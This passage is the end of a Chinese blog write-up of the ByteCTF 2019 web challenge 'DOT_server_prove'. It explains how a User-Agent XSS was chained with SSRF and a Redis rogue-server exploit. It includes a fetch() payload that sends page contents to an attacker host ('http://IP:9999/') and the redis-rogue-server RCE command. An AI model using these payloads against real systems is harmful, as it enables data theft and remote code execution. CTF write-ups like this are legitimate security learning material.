+<p><img src="http://shifeng-kaze.cn/blog/byteCTF2019_web_wp/25e34ee86507f1c45fe390137e899312.png" alt=""></p>
+<p>大佬通过函数名就判断出了这是go的二进制文件，这个真的学不会，以后能弄到go的二进制文件再来比对看看【整完hgame那题后也许这种映引入大量库的大概率是go？</p>
+<p>然后是<code>dot server</code>，见这篇<br><a href="https://www.cnblogs.com/yjf512/p/3773196.html" target="_blank" rel="noopener">如何开发打点统计系统</a><br>就是通过nginx日志（或者通过其它方式）获得入站信息并统计</p>
+<p>接着是这条命令对nginx日志的处理<br><code>cat /tmp/test.txt | awk -F &#39; &quot;&#39; &#39;{print $NF}&#39; &gt;&gt; /tmp/data.txt ;echo &#39;&#39; &gt; /tmp/test.txt</code><br>读取<code>/tmp/test.txt</code>中的信息，然后以<code>&quot;</code>将每行分隔为多列，并取最后一列的数据写入<code>/tmp/data.txt</code>，最后清空<code>/tmp/test.txt</code></p>
+<p>而nginx日志是（access.log）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.1.1.1 - - </span><br><span class="line">[09/Feb/2019:22:41:28 +0800] &quot;GET /index.html HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&quot;</span><br></pre></td></tr></table></figure>
+<p>处理之后应该是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.1.1.1 - - </span><br><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&quot;</span><br></pre></td></tr></table></figure>
+<p>剩余访问时间和UA</p>
+<p>由于可以通过查看题目的源码发现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var ajax = new XMLHttpRequest();</span><br><span class="line">    ajax.open(&apos;get&apos;,&apos;http://dot.whizard.com/123&apos;);</span><br><span class="line">    ajax.send();</span><br><span class="line">    ajax.onreadystatechange = function () &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>于是使用这个url的UA进行XSS，通过回弹的消息的RFF得到来自8080端口</p>
+<p><code>fetch(&#39;http://127.0.0.1:8080&#39;).then(r=&gt;r.text()).then(d=&gt;{fetch(&#39;http://IP:9999/&#39;+btoa(d))})</code> </p>
+<p>访问打页面源码，提示的<code>robots.txt</code>中提示了<code>curl.php</code>，能够进行SSRF。扫描发现6379端口开着</p>
+<p>这里需要利用Redis的RCE漏洞<br><a href="https://github.com/n0b0dyCN/redis-rogue-server" target="_blank" rel="noopener">Redis(&lt;=5.0.5) RCE</a><br>这样执行<br><code>python3 redis-rogue-server.py --rhost=target_ip --lhost=vps_ip --exp=exp.so</code></p>
+<p>不过由于要通过XSS打，所以要抓流量，然后再通过XSS打过去。一共三段流量，第一二段之间需要停顿3秒左右保证文件同步完成</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/12/11/SUCTF2019-web-wp/" rel="next" title="SUCTF2019 web 复现">
+                <i class="fa fa-chevron-left"></i> SUCTF2019 web 复现
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/01/31/hgame2020-web-wp/" rel="prev" title="hgame2020 web 复现">
+                hgame2020 web 复现 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="http://shifeng-kaze.cn/blog/head/kotori.jpg" alt="k0t0r1">
+            
+              <p class="site-author-name" itemprop="name">k0t0r1</p>
+              <p class="site-description motion-element" itemprop="description">～いらっしゃいません～</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://shifeng-kaze.cn/" title="shifeng-kaze" target="_blank">shifeng-kaze</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://aluvion.github.io" title="Aluvion" target="_blank">Aluvion</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#rss"><span class="nav-number">1.</span> <span class="nav-text">rss</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#boring-code"><span class="nav-number">2.</span> <span class="nav-text">boring_code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EzCMS"><span class="nav-number">3.</span> <span class="nav-text">EzCMS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyblog"><span class="nav-number">4.</span> <span class="nav-text">babyblog</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#icloudmusic"><span class="nav-number">5.</span> <span class="nav-text">icloudmusic</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOT-server-prove"><span class="nav-number">6.</span> <span class="nav-text">DOT_server_prove</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">k0t0r1</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+
+</body>
+</html>
